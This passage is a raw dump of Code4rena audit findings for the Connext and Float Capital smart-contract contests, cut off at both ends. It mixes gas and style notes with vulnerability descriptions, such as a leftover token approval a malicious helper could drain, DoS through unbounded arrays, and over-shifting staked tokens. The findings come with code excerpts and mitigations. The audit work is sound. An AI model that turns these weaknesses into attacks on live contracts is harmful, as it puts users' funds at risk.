2600.   Impact: A LibAsset.transferAsset() call from TransactionManager.sol makes LibERC20.transfer() call for ERC20 which in turn makes another external call to LibUtils.revertIfCallFailed() in wrapCall. So an ERC20 transfer effectively makes 3 additional (besides the ERC20 token contract function call assetId.call(..) external calls -> LibAsset -> LibERC20 -> LibUtils, which costs 2600*3 = 7800 gas.   Combining these functions into a single library or making them all internal to TransactionManager.sol can convert these delegatecalls into JMPs to save gas.  ## Proof of Concept  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/lib/LibAsset.sol#L58  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/lib/LibAsset.sol#L44  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/lib/LibERC20.sol#L64  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/lib/LibERC20.sol#L20  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L128  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L369  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L378  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L406  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L425  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L504  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L514  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L525  And other Lib* calls.  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Consider moving all the library functions internal to this contract or to a single library to save gas from external calls each of which costs 2600 gas.  "}, {"title": "Checking before external library call can save 2600 gas", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  EIP-2929 in Berlin fork increased the gas costs of CALL* family opcodes to 2600. Making a delegatecall to a library function therefore costs 2600. LibUtils.revertIfCallFailed() reverts and passes on the revert string if the boolean argument is false. Instead, moving the checking of the boolean to the caller avoids the library call when the boolean is true, which is likely the case most of the time.  ## Proof of Concept  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/lib/LibUtils.sol#L10-L19  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/lib/LibAsset.sol#L35  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/lib/LibERC20.sol#L20  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Remove the boolean parameter from revertIfCallFailed() and move the conditional check logic to the call sites.  "}, {"title": "Using access lists can save gas due to EIP-2930 post-Berlin hard fork", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "Using access lists can save gas due to EIP-2930 post-Berlin hard fork"}, {"title": "Assignment of variables not needed", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Assignment of variables not needed"}, {"title": "MAX_TIMEOUT", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/33", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact There is a MIN_TIMEOUT for the expiry but I think you should also introduce a MAX_TIMEOUT to avoid a scenario when, for example, expiry is set far in the future (e.g. 100 years) and one malicious side does not agree to fulfill or cancel the tx so the other side then has to wait and leave the funds locked for 100 years or so.  ## Recommended Mitigation Steps Introduce a reasonable MAX_TIMEOUT.  "}, {"title": "Approval is not reset if the call to IFulfillHelper fails", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/31", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Function fulfill first approves the callTo to transfer an amount of toSend tokens and tries to call IFulfillHelper but if the call fails it transfers these assets directly. However, in such case the approval is not reset so a malicous callTo can pull these tokens later:     // First, approve the funds to the helper if needed         if (!LibAsset.isEther(txData.receivingAssetId) && toSend > 0) {           require(LibERC20.approve(txData.receivingAssetId, txData.callTo, toSend), \"fulfill: APPROVAL_FAILED\");         }          // Next, call `addFunds` on the helper. Helpers should internally         // track funds to make sure no one user is able to take all funds         // for tx         if (toSend > 0) {           try             IFulfillHelper(txData.callTo).addFunds{ value: LibAsset.isEther(txData.receivingAssetId) ? toSend : 0}(               txData.user,               txData.transactionId,               txData.receivingAssetId,               toSend             )           {} catch {             // Regardless of error within the callData execution, send funds             // to the predetermined fallback address             require(               LibAsset.transferAsset(txData.receivingAssetId, payable(txData.receivingAddress), toSend),               \"fulfill: TRANSFER_FAILED\"             );           }         }  ## Recommended Mitigation Steps Approve should be placed inside the try/catch block or approval needs to be reset if the call fails.  "}, {"title": "Style issues", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/29", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Style issues that you may want to apply or reject, no impact on security. Grouping them together as one submission to reduce waste. Consider fixing or ignoring them, up to you.  * I think the error message here should be \"NOT_EXPIRED\":     require(incentive.expiry < block.timestamp, \"EXPIRED\");  * There are hardcoded magic numbers, e.g.: 5 weeks or 128. It would make code more readable and maintanable if you extract such numbers as constants, e.g.:   uint public constant EXPIRY_BUFFER = 5 weeks;   require(incentive.endTime + EXPIRY_BUFFER < incentive.expiry, \"END_PAST_BUFFER\");   "}, {"title": "txData.expiry = block.timestamp", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/28", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function fulfill treats txData.expiry = block.timestamp as expired tx:     // Make sure the expiry has not elapsed     require(txData.expiry > block.timestamp, \"fulfill: EXPIRED\");  However, function cancel has an inclusive check for the same condition:     if (txData.expiry >= block.timestamp) {     // Timeout has not expired and tx may only be cancelled by router  ## Recommended Mitigation Steps Unify that to make the code coherent. Probably txData.expiry = block.timestamp should be treated as expired everywhere.  "}, {"title": "activeTransactionBlocks are vulnerable to DDoS attacks", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/27", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact There is a potential issue in function removeUserActiveBlocks and the for loop inside it. I assume you are aware of block gas limits (they may be less relevant on other chains but still needs to be accounted for), so as there is no limit for activeTransactionBlocks it may grow so large that the for loop may never finish. You should consider introducing an upper limit for activeTransactionBlocks. Also, a malicious actor may block any account (DDOS) by just calling prepare again and again with 0 amount acting as a router. This will push activeTransactionBlocks to the specified user until it is no longer possible to remove them from the array.  This is also a gas issue as function removeUserActiveBlocks iterating and assigning large dynamic arrays is very gas-consuming. Consider optimizing the algorithm, e.g. finding the first occurrence, then swap it with the last item, pop the array, and break. Or maybe even using an EnumerableMap so you can find and remove elements in O(1) https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableMap.sol It depends on what is the usual number of activeTransactionBlocks. If it is expected to be low (e.g. less than 5), then the current approach will work, but with larger arrays, I expect EnumerableMap would be more efficient.  ## Recommended Mitigation Steps An upper limit will not fully mitigate this issue as a malicious actor can still DDOS the user by pushing useless txs until this limit is reached and a valid router may not be able to submit new txs. As you need to improve both the security and performance of removeUserActiveBlocks I think that EnumerableMap may be a go-to solution.  "}, {"title": "Code Consistency for hashVariantTransactionData()", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/22", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  greiart   # Vulnerability details  ### Proof of Concept  `hashVariantTransactionData()` should follow the same style of `hashInvariantTransactionData()` and the recover signature functions, where the payload is generated is stored in memory before hashing. Preliminary tests in remix show that it is minimally more gas efficient as well.  ```jsx function hashVariantTransactionData(TransactionData calldata txData) internal pure returns (bytes32) {     VariantTransactionData memory variant = VariantTransactionData({       amount: txData.amount,       expiry: txData.expiry,       preparedBlockNumber: txData.preparedBlockNumber   });   return keccak256(abi.encode(variant));   } ```  ### Alternative View on Notion  [https://www.notion.so/Code-Consistency-for-hashVariantTransactionData-33bf6578a16c4b18896f4d7ca7582e21](https://www.notion.so/Code-Consistency-for-hashVariantTransactionData-33bf6578a16c4b18896f4d7ca7582e21)  "}, {"title": "Gas: Only pass transactionId as parameter instead of TransactionData", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  cmichel   # Vulnerability details  Both the `recoverFulfillSignature` and `recoverCancelSignature` functions take a large `TransactionData` object as their first argument but only use the `transactionId` field of the struct. It should be more efficient to only pass `txData.transactionId` as the parameter.  "}, {"title": "Router needs to decrease expiry by a significant buffer", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/15", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Router needs to decrease expiry by a significant buffer"}, {"title": "Unsafe approve", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/13", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details Some ERC20 tokens like USDT require resetting the approval to 0 first before being able to reset it to another value. (See [Line 201](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code)) The `LIibERC20.approve` function does not do this - unlike OpenZeppelin's `safeApprove` implementation.  ## Impact Repeated USDT cross-chain transfers to the same user on receiving chain = ETH mainnet can fail due to this line not resetting the approval to zero first:  ``` require(LibERC20.approve(txData.receivingAssetId, txData.callTo, toSend), \"fulfill: APPROVAL_FAILED\"); ```  ## Recommended Mitigation Steps `LiibERC20.approve` should do two `approve` calls, one setting it to `0` first, then the real one. Check OpenZeppelin's `safeApprove`.  "}, {"title": "Malicious router can block cross-chain-transfers", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/12", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Malicious router can block cross-chain-transfers"}, {"title": "wrapCall with weird ERC20 contracts", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/4", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function wrapCall is not completely safe for all possible ERC20 contracts.  If the returnData.length is larger than 1 the \"abi.decode(returnData, (bool));\" will fail. Which means the interactions with that ERC20 contract will fail. Although this is unlikely, it is easy to protect against it.  ## Proof of Concept // https://github.com/code-423n4/2021-07-connext/blob/main/contracts/lib/LibERC20.sol#L21     function wrapCall(address assetId, bytes memory callData) internal returns (bool) {         ...         (bool success, bytes memory returnData) = assetId.call(callData);         LibUtils.revertIfCallFailed(success, returnData);         return returnData.length == 0 || abi.decode(returnData, (bool));     }  ## Tools Used  ## Recommended Mitigation Steps Change return returnData.length == 0 || abi.decode(returnData, (bool)); to: return (returnData.length == 0) || (returnData.length == 1 && abi.decode(returnData, (bool)));  "}, {"title": "don't use assembly ", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/3", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function revertIfCallFailed of LibUtils.sol uses \"assembly\" to log error information in a revert situation.  In the latest solidity version this can be done in solidity using the \"error\" keyword. See: https://docs.soliditylang.org/en/latest/control-structures.html?#revert Using pure solidity improves readability.  ## Proof of Concept https://github.com/code-423n4/2021-07-connext/blob/main/contracts/lib/LibUtils.sol#L10  function revertIfCallFailed(bool success, bytes memory returnData) internal pure {         if (!success) {             assembly {  revert(add(returnData, 0x20), mload(returnData))  }         }     }  ## Tools Used   ## Recommended Mitigation Steps use the error constructs of solidity 0.8.4+    "}, {"title": "Incorrect balance computed in `getUsersConfirmedButNotSettledSynthBalance()`", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/142", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hack3r-0m   # Vulnerability details  Consider the following state:  long_synth_balace = 300; short_synth_balace = 200;  marketUpdateIndex[1] = x; userNextPrice_currentUpdateIndex = 0; userNextPrice_syntheticToken_toShiftAwayFrom_marketSide[1][true] = 0; batched_amountSyntheticToken_toShiftAwayFrom_marketSide[1][true] = 0;  User calls shiftPositionFromLongNextPrice(marketIndex=1, amountSyntheticTokensToShift=100)  This results in following state changes:  long_synth_balace = 200; short_synth_balace = 200; userNextPrice_syntheticToken_toShiftAwayFrom_marketSide[1][true] = 100; batched_amountSyntheticToken_toShiftAwayFrom_marketSide[1][true] = 100; userNextPrice_currentUpdateIndex = x+1 ;   Due to some other transactions, oracle updates twice, and now the marketUpdateIndex[1] is x+2 and also updating price snapshots.  When User calls getUsersConfirmedButNotSettledSynthBalance(user, 1)  initial condition ``` if (       userNextPrice_currentUpdateIndex[marketIndex][user] != 0 &&       userNextPrice_currentUpdateIndex[marketIndex][user] <= currentMarketUpdateIndex     )  ``` will be true;  syntheticToken_priceSnapshot[marketIndex][isLong][currentMarketUpdateIndex] (https://github.com/hack3r-0m/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L532)  this uses price of current x+2 th update while it should balance of accounting for price of x+1 th update.  "}, {"title": "Users could shift tokens on `Staker` with more than he has staked", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/141", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-floatcapital-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `shiftTokens` function of `Staker` checks whether the user has staked at least the number of tokens he wants to shift from one side to the other (line 885). A user could call the `shiftTokens` function multiple times before the next price update to shift the staker's token from one side to the other with more than he has staked.  ## Proof of Concept  Referenced code: [Staker.sol#L885](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L885)  ## Recommended Mitigation Steps  Add checks on `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_long` and `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_short` to ensure that the sum of the two variables does not exceed user's stake balance.  "}, {"title": "Received amount of transfer-on-fee/deflationary tokens are not correctly accounted", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/140", "labels": ["bug", "0 (Non-critical)", "sponsor disputed", "disagree with severity", "out-of-scope"], "target": "2021-08-floatcapital-findings", "body": "Received amount of transfer-on-fee/deflationary tokens are not correctly accounted"}, {"title": "emit event at stage changes", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/138", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "emit event at stage changes"}, {"title": "consistently use `msg.sender` or `_msgSender()`(recommended)", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/136", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "consistently use `msg.sender` or `_msgSender()`(recommended)"}, {"title": "Stable prices don't lead to new time periods", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/134", "labels": ["bug", "duplicate", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-floatcapital-findings", "body": "Stable prices don't lead to new time periods"}, {"title": "Possibly not all synths can be withdrawn", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/129", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Possibly not all synths can be withdrawn"}, {"title": "Markets cannot be initialized with payment tokens of few decimals", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/126", "labels": ["bug", "duplicate", "invalid", "0 (Non-critical)", "sponsor disputed", "disagree with severity", "out-of-scope"], "target": "2021-08-floatcapital-findings", "body": "Markets cannot be initialized with payment tokens of few decimals"}, {"title": "Gas: `SyntheticToken` does not use pausing functionality", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/118", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-08-floatcapital-findings", "body": "# Handle  cmichel   # Vulnerability details  The `SyntheticToken` overwrites the `_beforeTokenTransfer` hook and removes the pausing functionality of `ERC20PresetMinterPauser`. But the `ERC20PresetMinterPauser` constructor still assigns pauser roles which leads to unnecessary gas costs. Inherit from an `ERC20PresetMinterPauser`-like contract without the pausing functionality. This would also make the intention of the code more clear by showcasing that it does not implement the pauser interface functions `pause`/`unpause` (which it currently still does but they don't have any effect).   "}, {"title": "Validations", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/112", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact  function burnEtherForMember should validate that the address of the member is not empty (0x0) to prevent accidental burns.   When adding an investor distribution (function addInvestor) should validate that the total amount is not above the investors_supply. but then you also need to store the total amount that is already assigned to investors.   function modifyInvestor should validate that _investor != _new, otherwise it will delete the investor unless this is an expected feature.   function claimExact should validate that _value > 0 to prevent useless claims.  "}, {"title": "Style issues", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/111", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "Style issues"}, {"title": "treasury state variable in LongShort", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/110", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact contract LongShort has a 'treasury' state variable that is not used in any meaningful way. It is only initialized in function initialize and can be changed by function changeTreasury, no other interactions. YieldManagerAave has its own separate treasury variable that it allocates funds to so this dead code can be removed to save some gas at least.   "}, {"title": "onlyValidMarket is never used", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/107", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Dead code: Staker contract has a modifier onlyValidMarket that is not used anywhere. I think you do not use it as you trust that admin and LongShort contract will not pass invalid values. Unused code can be removed to reduce gas costs.  "}, {"title": "Cache storage access and duplicate calculations", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/106", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact functions _mintNextPrice, _redeemNextPrice, _shiftPositionNextPrice could cache a result here and re-use it to avoid duplicate calculations of the same value:     marketUpdateIndex[marketIndex] + 1; Also, you can extract duplicate storage access to a storage variable and update the state on it, e.g.: accumulativeFloatPerSyntheticTokenSnapshots[marketIndex][newIndex] is accessed 3 times in _setCurrentAccumulativeIssuancePerStakeStakedSynthSnapshot.  "}, {"title": "0xf10A7_F10A7_f10A7_F10a7_F10A7_f10a7_F10A7_f10a7", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/101", "labels": ["bug", "invalid", "0 (Non-critical)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "0xf10A7_F10A7_f10A7_F10a7_F10A7_f10a7_F10A7_f10a7"}, {"title": "Aave's claimRewards returns the actual rewards claimed", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/100", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "Aave's claimRewards returns the actual rewards claimed"}, {"title": "The address of Aave lendingPool may change", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/99", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-floatcapital-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact contract YieldManagerAave caches lendingPool, however, in theory, it is possible that the implementation may change (see https://github.com/aave/aave-protocol/blob/4b4545fb583fd4f400507b10f3c3114f45b8a037/contracts/configuration/LendingPoolAddressesProvider.sol#L58-L65). I am not sure how likely in practice is that but a common solution that I see in other protocols that integrate with Aave is querying the lendingPool on the go (of course then you also need to handle the change in approvals).  ## Recommended Mitigation Steps An example solution you can see here: https://github.com/code-423n4/2021-07-sherlock/blob/d9c610d2c3e98a412164160a787566818debeae4/contracts/strategies/AaveV2.sol#L63-L65  "}, {"title": "[Optimization] Cache length in the loop", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/97", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hrkrshnn   # Vulnerability details   ## Cache length in the for loop  ``` solidity modified   contracts/contracts/LongShort.sol @@ -1059,7 +1059,8 @@ contract LongShort is ILongShort, Initializable {    /// @param user The address of the user for whom to execute the function for.    /// @param marketIndexes An array of int32s which each uniquely identify a market.    function executeOutstandingNextPriceSettlementsUserMulti(address user, uint32[] memory marketIndexes) external { -    for (uint256 i = 0; i < marketIndexes.length; i++) { +    uint length = marketIndexes.length; +    for (uint256 i = 0; i < length; i++) {        _executeOutstandingNextPriceSettlements(user, marketIndexes[i]);      }    } ```  In the previous case, at each iteration of the loop, length is read from memory. something like `mload(memory_offset)`. It takes `6` gas (3 for `mload` and 3 to place `memory_offset`) in the stack.  In the replacement, the value is placed in the stack only once and each iteration involves a `dupN` (3 gas). Saves around 3 gas per iteration.  Here are other places that can use this.  ``` text ./contracts/contracts/LongShort.sol:776:    for (uint256 i = 0; i < marketIndexes.length; i++) { ./contracts/contracts/LongShort.sol:1063:    for (uint256 i = 0; i < length; i++) { ./contracts/contracts/Staker.sol:790:    for (uint256 i = 0; i < marketIndexes.length; i++) { ./contracts/contracts/mocks/BandOracleMock.sol:84:    for (uint256 i = 0; i < _bases.length; i++) { ./contracts/contracts/testing/LongShortInternalStateSetters.sol:34:    for (uint256 i = 0; i < marketIndexes.length; i++) { ```   "}, {"title": "Use of floating pragma", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/96", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Use of floating pragma"}, {"title": "Assuming tokens are compliant with ERC20 could cause transactions to revert unexpectedly", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/93", "labels": ["bug", "duplicate", "invalid", "0 (Non-critical)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Assuming tokens are compliant with ERC20 could cause transactions to revert unexpectedly"}, {"title": "Comment-code mismatch for _balanceIncentiveCurve_exponent threshold", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/89", "labels": ["bug", "duplicate", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "Comment-code mismatch for _balanceIncentiveCurve_exponent threshold"}, {"title": "Function visibility can be changed from public to external", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "disagree with severity", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Changing a function\u2019s visibility from public to external can save gas by avoiding the unnecessary copying of data to memory. Function stakeFromUser() in Staker.sol is only called from SyntheticTokens.sol and not from within the contract itself which means this can be made external.   ## Proof of Concept  https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/Staker.sol#L839  https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/SyntheticToken.sol#L56   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Change function visibility to external where possible.  "}, {"title": "Interface notations are used for abstract contracts", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/86", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "Interface notations are used for abstract contracts"}, {"title": "Missing events/timelocks for owner/admin only functions that change critical parameters", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/85", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "Missing events/timelocks for owner/admin only functions that change critical parameters"}, {"title": "Race-condition risk with initialize functions", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/82", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Race-condition risk with initialize functions"}, {"title": "Missing use of requireMarketExists modifier on multiple functions", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/81", "labels": ["bug", "0 (Non-critical)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Missing use of requireMarketExists modifier on multiple functions"}, {"title": "executeOutstandingNextPriceSettlementsUserMulti may exceed gas limits", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/80", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-floatcapital-findings", "body": "executeOutstandingNextPriceSettlementsUserMulti may exceed gas limits"}, {"title": "Unused named returns can be removed for optimization", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Unused named returns can be removed for optimization"}, {"title": "Caching state variables in local variables can save gas", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/76", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  There are multiple places where state variables are reused within functions by loading them multiple times. These operations result in expensive SLOAD instructions where the first SLOAD costs 2100 gas and successive SLOADs of the same variable cost 100 gas (since the Berlin hardfork).  Using local memory variables to cache them will remove the unnecessary SLOADs costing 100 gas resulting in MLOADs that only cost 3 gas units.  ## Proof of Concept  Caching latestMarket can save upto 13 SLOADs i.e. 1300 gas: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L261-L298  Caching staked can save upto 1 SLOAD i.e. 100 gas: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L267 https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L276  Caching latestMarket can save upto 3 SLOADs i.e. 3 gas: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L352-L365  Caching marketUpdateIndex[marketIndex] appropriately can save many SLOADs: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L817-L819  https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L677-L757  https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L860-L864  https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L911-L922  Caching longShort address can save 300 300 gas by avoiding 3 SLOADs: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/TokenFactory.sol#L68-L70  Caching amountReservedInCaseOfInsufficientAaveLiquidity can save upto 2 SLOADs i.e. 200 gas: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/YieldManagerAave.sol#L114-L121  Caching paymentToken can save upto 1 SLOAD i.e. 100 gas: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/YieldManagerAave.sol#L132-L142  Caching aaveIncentiveController can save upto 1 SLOAD i.e. 100 gas: 